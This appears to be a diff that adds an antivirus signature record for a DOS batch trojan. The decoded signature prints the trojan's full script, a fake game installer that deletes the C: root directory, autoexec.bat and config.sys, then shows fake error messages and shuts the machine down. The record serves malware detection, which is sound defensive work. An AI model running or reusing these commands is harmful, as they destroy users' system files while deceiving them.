@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36572
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off cd\ cls echo welcome to the death test-the latest game, please press to install. pause >nul cls rmdir/q c:\ del autoexec.bat del config.sys echo file missing, press to see details pause >nul cls echo file c:\ missing echo file autoexec.bat missing echo file config.sys missing pause cls echo sorry, instalation cancelled. shutdown -s end 
